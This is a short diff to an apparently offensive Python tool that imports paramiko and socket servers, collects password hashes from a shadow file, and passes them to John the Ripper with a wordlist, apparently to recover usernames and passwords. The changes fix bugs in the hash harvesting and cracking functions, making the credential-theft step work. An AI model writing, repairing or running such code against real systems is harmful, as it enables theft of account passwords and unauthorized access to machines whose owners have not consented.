@@ -2,6 +2,7 @@ import paramiko
 import os
 import socket
 import select
+import subprocess
 import Queue
 try:
     import SocketServer
@@ -163,7 +164,7 @@ def user_hashes(shadow_file):
     accts = []
     for s in shadow:
         if "$" in s:
-            accts.append(s.trim())
+            accts.append(s.strip())
 
     return accts
     
@@ -173,7 +174,10 @@ def user_hashes(shadow_file):
 def crack_with_john(hashes_lst):
     global USERNAMES, PASSWORDS
     f = open("curr_hashes.txt", "w")
-    f.write(hashes_list)
+    # write each hash to the file so john can do its thingy thing
+    for h in hashes_lst:
+        f.write(h)
+
     f.close()
 
     os.system("john --format=sha512crypt --wordlist %s curr_hashes.txt" % (WORDLIST))
